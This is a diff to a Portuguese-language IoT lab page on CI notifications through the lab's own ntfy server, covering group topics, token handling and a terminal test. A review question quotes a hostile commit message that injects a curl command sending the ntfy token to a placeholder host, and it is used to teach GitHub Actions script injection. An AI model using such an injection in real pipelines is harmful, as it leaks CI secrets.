@@ -1037,6 +1037,33 @@ numa tag `v1.0.0`, o pipeline cria uma **release** no GitHub com o `firmware.bin
 gravar. E alguém precisa **saber** do resultado sem ficar olhando a aba Actions: o ntfy
 manda uma notificação para o celular.
 
+### O ntfy do LAB IoT
+
+O laboratório tem um ntfy próprio, o mesmo do portal, com uma conta por grupo. Cada grupo só lê
+e publica nos tópicos `lab11-<letra>` e `lab11-<letra>-*`; os outros grupos não veem as suas
+notificações, e quem não tem login não vê nada.
+
+| Para                        | Valor                                                                    |
+| --------------------------- | ------------------------------------------------------------------------ |
+| Servidor (app, `NTFY_URL`)  | `https://iot.adrianoruseler.com/ntfy`                                    |
+| Login no app                | usuário `lab11-<letra>` e a senha do grupo                               |
+| Tópico do CI (`NTFY_TOPIC`) | `lab11-<letra>-ci` (ex.: `lab11-x-ci`)                                   |
+| Token (`NTFY_TOKEN`)        | o token ntfy do grupo (`tk_...`)                                         |
+| Ler e publicar no navegador | [iot.adrianoruseler.com/avisos/](https://iot.adrianoruseler.com/avisos/) |
+
+A senha e o token estão no `ACESSO-LAB11.md` do repositório do grupo. Copie-os para os
+**Secrets** (5.2), e **nunca** para o `ci.yml`, o `README.md` ou uma evidência: o token publica
+em nome do grupo. Se um vazar, avise o professor, que gera outro.
+
+No app (Android/iOS): ⚙ → **Usuários** → adicionar o servidor acima com o login do grupo;
+depois **+** → assinar o tópico `lab11-<letra>-ci` **nesse servidor** (não no `ntfy.sh`).
+
+:::warning[O servidor do laboratório precisa estar ligado]
+O GitHub Actions chega ao ntfy pelo endereço público, que passa pelo servidor do laboratório.
+Com o laboratório desligado, a notificação se perde (o passo tem `continue-on-error`: o CI não
+fica vermelho por isso). Faça o experimento abaixo durante a aula.
+:::
+
 ### Requisitos
 
 1. **Job `publicar`**: roda só em tags `v*`, depois de `firmware` e `simulacao`, e cria a
@@ -1126,12 +1153,21 @@ manda uma notificação para o celular.
            bash ci/notificar.sh "$resultado" "$titulo" "$mensagem"
    ```
 
-   Antes do CI, teste o script no seu terminal (Git Bash, ou WSL, no Windows):
+   Antes do CI, teste o script no seu terminal (Git Bash, ou WSL, no Windows), com o app já
+   assinando o tópico. O token fica só no terminal, não em arquivo:
 
    ```bash title="Git Bash"
-   NTFY_TOPIC=<seu-topico> NTFY_URL=<servidor> NTFY_TOKEN=<token> \
+   read -rsp "Token ntfy do grupo: " NTFY_TOKEN; echo; export NTFY_TOKEN
+   NTFY_URL=https://iot.adrianoruseler.com/ntfy NTFY_TOPIC=lab11-x-ci \
      bash ci/notificar.sh success "teste do grupo X" "olá do terminal"
    ```
+
+   ```text title="Saída esperada"
+   ntfy: 'teste do grupo X' publicado em https://iot.adrianoruseler.com/ntfy/lab11-x-ci (success)
+   ```
+
+   Troque `x` pela letra do grupo. Um `403` quer dizer tópico de outro grupo (ou token errado);
+   um `502`, o servidor do laboratório desligado.
 
 3. **Experimento** (cada passo gera uma notificação)
    1. **Vermelho de propósito:** num ramo `quebra`, mude o `HISTERESE` para `0.0f` e abra um
@@ -1174,7 +1210,8 @@ manda uma notificação para o celular.
 Chega notificação? Por quê? (b) Por que a mensagem do commit entra no `run:` pela variável
 `COMMIT_MSG`, e não escrita como `${{ github.event.head_commit.message }}` dentro do script?
 Imagine um commit com a mensagem `x"; curl https://exemplo.invalid/?t=$NTFY_TOKEN; echo "`.
-(c) No `ntfy.sh` público, quem pode **ler** e quem pode **publicar** no seu tópico?
+(c) No ntfy do LAB IoT, quem pode **ler** e quem pode **publicar** em `lab11-x-ci`? E se o
+grupo usasse o `ntfy.sh` público, sem login, com o mesmo nome de tópico?
 :::
 
 <FileTree
@@ -1197,7 +1234,5 @@ Imagine um commit com a mensagem `x"; curl https://exemplo.invalid/?t=$NTFY_TOKE
 ---
 
 ## Logout do seu ambiente dev, git e gh {/* #logout */}
-
-<GitLogOut />
 
 <LabLogout />
